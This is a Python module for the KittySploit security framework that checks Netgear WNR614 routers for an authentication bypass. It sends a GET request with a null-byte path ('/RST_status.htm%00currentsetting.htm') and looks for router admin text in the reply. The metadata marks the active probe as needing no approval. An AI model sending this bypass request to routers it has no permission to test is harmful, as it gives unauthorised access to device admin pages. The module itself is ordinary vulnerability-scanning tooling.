#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability in the Netgear WNR614 router permits unauthorized individuals to bypass the authentication."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Netgear WNR614 - Improper Authentication Detection',
        'description': 'A vulnerability in the Netgear WNR614 router permits unauthorized individuals to bypass the authentication. When adding "%00currentsetting.htm" to the the requested url, it will be recognized as passing the authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'cve', 'cve2024', 'netgear', 'router', 'exposure', 'wnr614', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Shuanunio/CVE_Requests/blob/main/Netgear/WNR614/assets/image-20241210153405727.png',
            'https://github.com/Shuanunio/CVE_Requests/blob/main/Netgear/WNR614/ACL%20bypass%20Vulnerability%20in%20Netgear%20WNR614.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/RST_status.htm%00currentsetting.htm', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Router Information', 'Show Statistics', 'Internet Port',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Netgear WNR614 - Improper Authentication detected",
                path='/RST_status.htm%00currentsetting.htm',
            )
            return True
        return False

